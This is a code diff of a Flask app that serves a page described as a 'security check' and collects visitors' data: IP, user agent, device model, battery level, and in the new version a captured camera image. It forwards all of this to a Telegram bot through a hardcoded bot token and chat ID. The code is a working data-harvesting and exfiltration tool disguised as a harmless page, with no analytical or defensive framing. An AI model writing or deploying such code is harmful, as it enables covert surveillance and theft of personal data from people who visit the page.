@@ -1,57 +1,64 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, render_template, request, jsonify
+import os
+import base64
 import requests
+from io import BytesIO
 
 app = Flask(__name__)
 
-# Telegram Bot Setup
-TELEGRAM_BOT_API = 'https://api.telegram.org/bot7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78/sendMessage'
-CHAT_ID = '912211827'
+# Telegram Bot details
+TELEGRAM_TOKEN = "7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78"
+TELEGRAM_CHAT_ID = "912211827"
 
-def send_to_telegram(message):
-    data = {
-        'chat_id': CHAT_ID,
-        'text': message
-    }
-    response = requests.post(TELEGRAM_BOT_API, data=data)
-    return response
+# Set up a folder for storing captured images (optional)
+UPLOAD_FOLDER = 'uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# Route to render the security check page
 @app.route('/')
-def index():
+def home():
     return render_template('index.html')
 
-@app.route('/sendData', methods=['POST'])
-def collect_data():
-    # Receive data from the frontend
-    data = request.get_json()
+@app.route('/submit_data', methods=['POST'])
+def submit_data():
+    data = request.get_json()  # Get JSON data from the frontend
+    device_info = data.get('device_info')
+    image_data = data.get('image_data')
+
+    if image_data:
+        try:
+            # Decode the base64 image data
+            img_data = base64.b64decode(image_data)
+            
+            # Send the image to the Telegram bot
+            send_image_to_telegram(img_data)
+            print("Image sent to Telegram bot.")
+
+        except Exception as e:
+            return jsonify({"message": "Error processing the image", "error": str(e)}), 500
     
-    # Extract the relevant information from the data
-    ip = data['ip']
-    userAgent = data['userAgent']
-    deviceName = data['deviceName']
-    deviceModel = data['deviceModel']
-    batteryLevel = data['batteryLevel']
-    image = data['image']
+    # Process or save the device_info (e.g., log to a file)
+    if device_info:
+        print("Device Info:", device_info)
 
-    # Create a formatted message
-    message = f"""
-    IP Address: {ip}
-    User Agent: {userAgent}
-    Device Name: {deviceName}
-    Device Model: {deviceModel}
-    Battery Level: {batteryLevel}
-    Image: {image}  # This is the base64 encoded image
-    """
+    return jsonify({"message": "Data received successfully!"})
 
-    # Send the message to Telegram bot
-    response = send_to_telegram(message)
+def send_image_to_telegram(image_data):
+    """Send the captured image to the Telegram bot."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+    
+    # Prepare the image to be sent as a file-like object
+    image_file = BytesIO(image_data)
+    image_file.name = "captured_image.png"  # Set a name for the file
+    
+    files = {'photo': image_file}
+    data = {'chat_id': TELEGRAM_CHAT_ID}
+    
+    # Send the request to the Telegram Bot API
+    response = requests.post(url, data=data, files=files)
 
-    # Return a response indicating success
-    if response.status_code == 200:
-        return jsonify({'status': 'Data sent successfully!'})
-    else:
-        return jsonify({'status': 'Failed to send data to Telegram.'}), 500
+    if not response.ok:
+        raise Exception(f"Error sending image to Telegram: {response.text}")
 
-if __name__ == '__main__':
-    # Run the Flask app on all network interfaces and accessible on all IPs
-    app.run(debug=True, host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    app.run(debug=True)
